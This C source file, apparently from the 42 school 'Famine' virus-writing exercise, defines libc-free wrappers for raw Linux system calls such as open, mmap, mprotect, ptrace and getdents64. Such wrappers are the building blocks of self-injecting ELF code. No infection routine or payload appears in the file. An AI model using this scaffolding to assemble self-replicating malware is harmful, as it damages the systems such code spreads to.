/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   syscall.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 22:22:08 by jfortin           #+#    #+#             */
/*   Updated: 2019/06/06 01:02:51 by jfortin          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "syscall.h"

#define _u __attribute__((unused))

inline ssize_t famine_read(_u int fd, _u void *buf, _u size_t count)
{
	wrap_syscall(SYS_READ);
	__builtin_unreachable();
}

inline ssize_t	famine_write(_u int fd, _u const void *buf, _u size_t count)
{
	wrap_syscall(SYS_WRITE);
	__builtin_unreachable();
}

inline int	famine_open(_u const char *pathname, _u int flags, ...)
{
	wrap_syscall(SYS_OPEN);
	__builtin_unreachable();
}

inline int	famine_close(_u int fd)
{
	wrap_syscall(SYS_CLOSE);
	__builtin_unreachable();
}

inline int	famine_fstat(_u int fd, _u struct stat *statbuf)
{
	wrap_syscall(SYS_FSTAT);
	__builtin_unreachable();
}

inline void	*famine_mmap(_u void *addr, _u size_t length, _u int prot, _u int flags, _u int fd, _u
		off_t offset)
{
	wrap_syscall(SYS_MMAP);
	__builtin_unreachable();
}

inline int	famine_mprotect(_u void *addr, _u size_t len, _u int prot)
{
	wrap_syscall(SYS_MPROTEC);
	__builtin_unreachable();
}

inline int	famine_munmap(_u void *addr, _u size_t length)
{
	wrap_syscall(SYS_MUNMAP);
	__builtin_unreachable();
}

inline long	famine_ptrace(_u enum __ptrace_request request,
	_u pid_t pid, _u void *addr, _u void *data)
{
	wrap_syscall(SYS_PTRACE);
	__builtin_unreachable();
}

inline int	famine_getdents64(_u unsigned int fd, _u struct dirent *dirp, _u unsigned int count)
{
	wrap_syscall(SYS_GETDENTS64);
	__builtin_unreachable();
}
